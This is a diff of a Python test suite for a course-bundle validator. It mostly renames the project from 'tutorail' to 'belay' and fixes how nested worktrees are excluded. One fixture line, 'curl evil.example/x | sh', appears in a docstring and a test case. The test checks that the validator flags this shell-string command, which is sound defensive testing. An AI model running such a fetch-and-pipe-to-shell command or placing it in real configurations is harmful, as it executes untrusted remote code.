@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
-"""Test suite for skills/tutorail/scripts/validate_bundle.py.
+"""Test suite for skills/belay/scripts/validate_bundle.py.
 
 Run it with:  python3 tests/test_validate_bundle.py
 
 No pytest. PyYAML may or may not be installed; it makes no difference,
-because the scripts never use it (tutorAIl#29). The suite asserts that,
+because the scripts never use it (belay#29). The suite asserts that,
 in test_yaml_reader_ignores_the_environment.
 
 The point of this suite is NOT to show the validator passing. A validator that
@@ -46,11 +46,11 @@ from typing import Callable
 
 HERE = Path(__file__).resolve().parent
 REPO = HERE.parent
-SCRIPT = REPO / "skills" / "tutorail" / "scripts" / "validate_bundle.py"
+SCRIPT = REPO / "skills" / "belay" / "scripts" / "validate_bundle.py"
 FIXTURES = HERE / "fixtures"
 
 # Checkouts OUTSIDE this repository - the published bundles in
-# skomp/tutorail-bundles and the learner workspace in skomp/automaton-db -
+# skomp/belay-bundles and the learner workspace in skomp/automaton-db -
 # are swept only when this is set. They are separate checkouts at their own
 # revisions, so sweeping them by default made the suite validate bundles that
 # are NOT in the commit under test, and made the assertion total depend on
@@ -58,8 +58,8 @@ FIXTURES = HERE / "fixtures"
 # with them, at one commit. A reader who saw one number where the README
 # quoted the other could not tell a defect from an absent sibling. The sweep
 # still finds real defects in those bundles, so it is opt-in rather than
-# gone, and what it finds is counted apart from the total. See tutorAIl#37.
-SIBLING_SWEEP_ENV = "TUTORAIL_SWEEP_SIBLING_REPOS"
+# gone, and what it finds is counted apart from the total. See belay#37.
+SIBLING_SWEEP_ENV = "BELAY_SWEEP_SIBLING_REPOS"
 SWEEP_SIBLINGS = os.environ.get(SIBLING_SWEEP_ENV, "") not in ("", "0")
 
 
@@ -106,7 +106,7 @@ BASELINES = {
     # The three relationship baselines - the normative example from
     # 2026-09-12-bundle-relationships-design.md section 10, as the smallest
     # bundles that can carry it. They are deliberately NOT in
-    # skills/tutorail/examples/: three materialisable courses would bloat
+    # skills/belay/examples/: three materialisable courses would bloat
     # every plugin install to illustrate a documentation point.
     #
     # Together they are the positive control the relationship checks would
@@ -650,7 +650,7 @@ def _redeclare_cargo_check(root: Path, literal: str, expected: object) -> None:
     case below turns on the TYPE the reader hands check 8 - str, list, a
     list holding an int, an empty list - and a quoting slip would silently
     turn a case into a test of something else that still passes. The
-    measured hole (tutorAIl#31: `command: "curl evil.example/x | sh"` exits
+    measured hole (belay#31: `command: "curl evil.example/x | sh"` exits
     0 with no finding) is a STRING where a list was meant, so asserting the
     parsed type is the whole of the fixture verification.
     """
@@ -676,7 +676,7 @@ def _redeclare_cargo_check(root: Path, literal: str, expected: object) -> None:
 
 
 def m_command_is_a_shell_string(root: Path) -> None:
-    """The exact line tutorAIl#31 measured passing in silence."""
+    """The exact line belay#31 measured passing in silence."""
     _redeclare_cargo_check(
         root,
         'cargo-check: { kind: command, command: "curl evil.example/x | sh" }',
@@ -2536,7 +2536,7 @@ def _append_top_level(root: Path, literal: str, expected: dict) -> None:
 
 
 def m_unknown_top_level_field(root: Path) -> None:
-    """The exact line tutorAIl#24 measured passing in silence."""
+    """The exact line belay#24 measured passing in silence."""
     _append_top_level(root, "zzz_not_a_field: 1", {"zzz_not_a_field": 1})
 
 
@@ -2549,7 +2549,7 @@ def m_three_unknown_top_level_fields(root: Path) -> None:
 
 
 def m_misspelled_teaching_method(root: Path) -> None:
-    """The case tutorAIl#24 exists for: a MAY whose name went wrong.
+    """The case belay#24 exists for: a MAY whose name went wrong.
 
     Nothing else in the validator can see this. Check 27 only ever reads
     the value under the correctly spelled key, so a course that silently
@@ -3245,7 +3245,7 @@ CASES: list[Case] = [
          m_validator_unknown_kind, "kind 'file-exsits' is not one of"),
     Case("8: a validator omits a required field", 8, "automaton", "bundle",
          m_validator_missing_field, "requires the field 'path'"),
-    # ---- check 8's command type rule (tutorAIl#31, design section 6.1). The
+    # ---- check 8's command type rule (belay#31, design section 6.1). The
     # measured hole is the first case: before this rule, a `command` that was
     # a shell string exited 0 with no finding.
     Case("8: a command validator's command is a shell string", 8, "automaton",
@@ -3777,7 +3777,7 @@ CASES: list[Case] = [
          "instance", m_teaching_method_is_a_sentence, kind="silent"),
     # ---- check 28: unrecognised top-level manifest fields. WARNINGS ONLY,
     # always, in both modes.
-    Case("28: the line tutorAIl#24 measured passing in silence", 28, "cli",
+    Case("28: the line belay#24 measured passing in silence", 28, "cli",
          "bundle", m_unknown_top_level_field,
          "unknown top-level field 'zzz_not_a_field'", kind="warns",
          where="tutorial.yaml"),
@@ -3892,7 +3892,7 @@ _passed = 0
 # Assertions made against a checkout OUTSIDE this repository are counted
 # apart from the total, so the number this suite reports stays reproducible
 # from the commit under test alone whether or not the sweep is opted into.
-# The two are never added together (tutorAIl#37).
+# The two are never added together (belay#37).
 _sibling_passed = 0
 _fired_checks: set[int] = set()
 # Checks demonstrated producing a WARNING. A warning-only check can never
@@ -4434,7 +4434,7 @@ def test_real_repositories() -> None:
         (
             "bundle",
             Path.home()
-            / "src/github.com/skomp/tutorail-bundles/rust-automaton-db",
+            / "src/github.com/skomp/belay-bundles/rust-automaton-db",
             True,
         ),
         (
@@ -4442,7 +4442,7 @@ def test_real_repositories() -> None:
             Path.home() / "src/github.com/skomp/automaton-db/tutorial",
             True,
         ),
-        ("bundle", REPO / "skills/tutorail/examples/rust-cli-basics", False),
+        ("bundle", REPO / "skills/belay/examples/rust-cli-basics", False),
     ]
     for mode, path, outside in externals:
         reason = skip_reason(path, outside)
@@ -4633,8 +4633,8 @@ def test_yaml_reader() -> None:
         repr(load("s: |\n  line one\n  line two\n")),
     )
     record(
-        load("v: local:../tutorail-bundles/rust-automaton-db")["v"]
-        == "local:../tutorail-bundles/rust-automaton-db",
+        load("v: local:../belay-bundles/rust-automaton-db")["v"]
+        == "local:../belay-bundles/rust-automaton-db",
         "a plain scalar containing a colon is not split",
         repr(load("v: local:../x")),
     )
@@ -4703,7 +4703,7 @@ def test_yaml_reader() -> None:
 # The reader does not depend on the environment
 # --------------------------------------------------------------------------
 #
-# tutorAIl#29: load_yaml used to prefer PyYAML when it could import it, so the
+# belay#29: load_yaml used to prefer PyYAML when it could import it, so the
 # verdict a bundle got - and the diagnostic its author read - was decided by
 # what happened to be installed on the machine. The three cases below are the
 # ones that differed: an anchor and a duplicate key were ACCEPTED by PyYAML and
@@ -4723,7 +4723,7 @@ import yamlite
 try:
     import yaml
     importable = True
-    decoy = getattr(yaml, "__tutorail_decoy__", False)
+    decoy = getattr(yaml, "__belay_decoy__", False)
 except Exception:
     importable = False
     decoy = False
@@ -4797,12 +4797,12 @@ def test_yaml_reader_ignores_the_environment() -> None:
 
         # A yaml module that IMPORTS and answers wrongly. Without it, this
         # block can only compare two identical environments on a machine with
-        # no PyYAML, and a reader that prefers PyYAML would pass (tutorAIl#47).
+        # no PyYAML, and a reader that prefers PyYAML would pass (belay#47).
         # The decoy is importable everywhere, so the guard fires everywhere.
         decoy = root / "decoyyaml"
         decoy.mkdir()
         (decoy / "yaml.py").write_text(
-            "__tutorail_decoy__ = True\n"
+            "__belay_decoy__ = True\n"
             "class YAMLError(Exception):\n    pass\n"
             "def safe_load(*a, **k):\n"
             "    return {'__decoy__': 'the reader consulted PyYAML'}\n"
@@ -4824,7 +4824,7 @@ def test_yaml_reader_ignores_the_environment() -> None:
     # The decoy is the guard that fires on ANY machine. It imports, so a reader
     # that prefers PyYAML reaches it; it answers with a sentinel, so consulting
     # it is visible. Without this, a machine with no PyYAML compares two
-    # identical environments and a reintroduced preference passes (tutorAIl#47).
+    # identical environments and a reintroduced preference passes (belay#47).
     record(
         with_decoy["yaml_importable"] is True and with_decoy["decoy"] is True,
         "the decoy yaml module was importable by the probe (the guard is armed)",
@@ -5490,7 +5490,7 @@ TOP_LEVEL_FIXTURES = {
     "misspelling": FIXTURES / "catalog-toplevel-misspelling" / "catalog.yaml",
 }
 
-REAL_CATALOGUE = Path.home() / "src/github.com/skomp/tutorail-bundles/catalog.yaml"
+REAL_CATALOGUE = Path.home() / "src/github.com/skomp/belay-bundles/catalog.yaml"
 
 
 def _warnings_for(report, check: int) -> list:
@@ -5965,7 +5965,7 @@ def test_catalog_top_level_check_reads_keys_not_text() -> None:
 def test_real_catalogue_gains_no_warning() -> None:
     """The best available regression, and its own positive control.
 
-    The catalogue in skomp/tutorail-bundles is generated, and its header
+    The catalogue in skomp/belay-bundles is generated, and its header
     comment names `optional_lesson_count` in exactly the shape the issue
     describes. It must still validate at exit 0 with NO new warning.
     """
@@ -6546,7 +6546,7 @@ def test_manifest_near_miss_distance() -> None:
     near_misses() is shared with catalogue mode, but the list it is given
     here is different and four times longer, so the two properties that
     matter have to be re-established against THIS list: the spellings
-    tutorAIl#24 is about are matched, and no field this format defines is a
+    belay#24 is about are matched, and no field this format defines is a
     near miss for another - which would make a real key's suggestion
     ambiguous the moment someone typed a neighbour of it.
     """
@@ -6595,7 +6595,7 @@ def test_known_manifest_fields_match_the_field_reference() -> None:
     silently returned nothing would make the comparison below vacuous.
     """
     print("\ncheck 28: the field list against bundle-format.md section 2:")
-    doc = REPO / "skills/tutorail/references/bundle-format.md"
+    doc = REPO / "skills/belay/references/bundle-format.md"
     text = doc.read_text()
     marker = "\n### Field reference\n"
     record(
@@ -6980,11 +6980,17 @@ def test_no_manifest_in_reach_gains_an_unknown_field_warning() -> None:
     # under test, and made the suite's assertion total depend on how many
     # worktrees the machine happens to have: 614 with none, 622 with one, 638
     # with three, all at one commit. A reader who runs the suite and sees a
-    # different number could not tell a defect from a worktree. See tutorAIl#37.
+    # different number could not tell a defect from a worktree. See belay#37.
+    # Anchor the exclusion at THIS checkout's own worktree directory. A bare
+    # substring test excluded the checkout under test whenever the suite was
+    # run from inside a worktree, because that checkout's own path contains
+    # `.claude/worktrees/`: in_repo came back empty, and the positive control
+    # below raised IndexError on manifests[0] before it could report anything.
+    nested_worktrees = (REPO / ".claude" / "worktrees").as_posix() + "/"
     in_repo = sorted(
         m
         for m in REPO.glob("**/tutorial.yaml")
-        if ".claude/worktrees/" not in m.as_posix()
+        if not m.as_posix().startswith(nested_worktrees)
     )
     manifests = list(in_repo)
     record(
@@ -6992,7 +6998,7 @@ def test_no_manifest_in_reach_gains_an_unknown_field_warning() -> None:
         f"the sweep found {len(manifests)} manifests in this repository",
         "the glob found almost nothing, so a clean sweep proves nothing",
     )
-    published = Path.home() / "src/github.com/skomp/tutorail-bundles"
+    published = Path.home() / "src/github.com/skomp/belay-bundles"
     from_published: list[Path] = []
     reason = sibling_skip_reason(published)
     if reason:
@@ -7054,9 +7060,9 @@ def test_no_real_bundle_ships_a_stamped_template() -> None:
     needle = vb.ASSUMES_REVIEWED
     record(bool(needle), "the search term is non-empty", f"needle = {needle!r}")
 
-    published = Path.home() / "src/github.com/skomp/tutorail-bundles"
+    published = Path.home() / "src/github.com/skomp/belay-bundles"
     bundles = [
-        (REPO / "skills/tutorail/examples/rust-cli-basics", False),
+        (REPO / "skills/belay/examples/rust-cli-basics", False),
         (published / "rust-automaton-db", True),
         (published / "webgl-typescript-scene", True),
         (FIXTURES / "durable-event-broker", False),
@@ -7101,7 +7107,7 @@ def test_no_real_bundle_ships_a_stamped_template() -> None:
 
 
 # --------------------------------------------------------------------------
-# The disclosure block (design section 5.4 and 5.5, tutorAIl#45)
+# The disclosure block (design section 5.4 and 5.5, belay#45)
 # --------------------------------------------------------------------------
 
 EM_DASH = "—"
@@ -7225,7 +7231,7 @@ def test_disclosure_extraction_helper() -> None:
     )
 
     synthetic = (
-        "tutorAIl validator - mode: bundle\n"
+        "Belay validator - mode: bundle\n"
         "target:      /somewhere\n"
         "yaml reader: builtin\n"
         "disclosure:\n"
@@ -7514,8 +7520,8 @@ def test_the_total_is_reproducible_from_this_commit() -> None:
     """The reported total must not depend on what else the machine holds.
 
     Run last, because it reads the counter every other sweep writes to. The
-    defect it guards is tutorAIl#37: the suite reported 606 assertions on a
-    machine without skomp/tutorail-bundles and 628 on a machine with it, at
+    defect it guards is belay#37: the suite reported 606 assertions on a
+    machine without skomp/belay-bundles and 628 on a machine with it, at
     one commit, and README.md quoted one of the two.
 
     The second assertion is the positive control for the gate. A directory
@@ -7639,7 +7645,7 @@ def main() -> int:
     print()
     # Said in both branches, and never added to the total: the sibling
     # checkouts are at their own revisions, so an assertion about them is not
-    # an assertion about this commit (tutorAIl#37).
+    # an assertion about this commit (belay#37).
     if _sibling_passed:
         print(
             f"{_sibling_passed} further assertions passed against sibling "
